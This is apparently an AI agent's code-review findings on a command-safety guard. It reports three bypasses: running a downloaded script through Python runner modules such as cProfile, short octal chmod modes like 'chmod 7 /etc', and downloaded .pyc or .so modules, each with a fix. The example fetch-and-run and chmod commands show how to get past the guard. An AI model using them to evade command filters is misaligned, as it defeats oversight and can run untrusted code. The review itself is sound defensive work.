content.text: Done reviewing. I couldn't run the probe commands because they need approval, so these findings come from reading the code. Reporting now.

findings.explanation: Before this change, `python3 -m cProfile x.py` went to the generic interpreter branch. `operands()` treats `-m` as taking a value, so it skipped `cProfile` and returned `x.py` as the executed file, and `curl -o x.py URL && python3 -m cProfile x.py` was denied as run-downloaded. The new python-module branch comes first and only adds the module's own lookup files (cProfile.py, cProfile/__init__.py, ...). The module's arguments (`_python_options(...)[1]`) are thrown away. Stdlib runner modules that execute a script given as an argument (cProfile, profile, trace, pdb, runpy, timeit -s, etc.) now pass a downloaded script through without the run-downloaded check firing. This is a bypass the change introduces into the guard.
findings.fix: Keep the module-file candidates, and also add the script argument for runner modules. For example: `opts = _python_options(args); files += _module_files(opts[0]); files += [a for a in opts[1] if not a.startswith('-')][:1]` (or all non-flag module args), excluding STDIN_PATHS. That keeps the old behavior as a superset.

findings.explanation: chmod accepts short octal modes: `chmod 2 f` = 0002, `chmod 7 f` = 0007, `chmod 77 f` = 0077, and all of these make the file world-writable. The rewritten numeric regex is applied with fullmatch and needs at least three digits, so `chmod 7 /etc` or `chmod 02 /usr/local/bin` slip past both `_chmod_dangerous` (world-writable on a broad target) and `_chmod_world_single`. Neither the validator nor `_grants` sees them as world-writable, because the symbolic `_CLAUSE` regex doesn't match digits, so the check fails open.
findings.fix: Parse numeric modes as octal (`re.fullmatch(r'[0-7]+', mode)` then `int(mode, 8)`) and test the bits directly: `& 0o002` for world-writable and `& 0o6000` for setuid/setgid. Don't rely on digit-position regexes.

findings.explanation: `_module_files` only lists .py source files. When no .py exists, Python's import system also loads sourceless bytecode (`base64.pyc` in a sys.path directory) and extension modules (`base64.cpython-3XX-darwin.so`, `base64.so`, `.abi3.so`) from the current directory. So `curl -o base64.pyc URL && python3 -m base64`, or a downloaded .so, still runs downloaded code without the new run-downloaded check firing.
findings.fix: Also list `{stem}.pyc`, `{stem}/__init__.pyc`, and the extension suffixes from `importlib.machinery.EXTENSION_SUFFIXES` (or match any downloaded path whose basename starts with `{stem}.` and ends in .so/.pyd/.pyc).
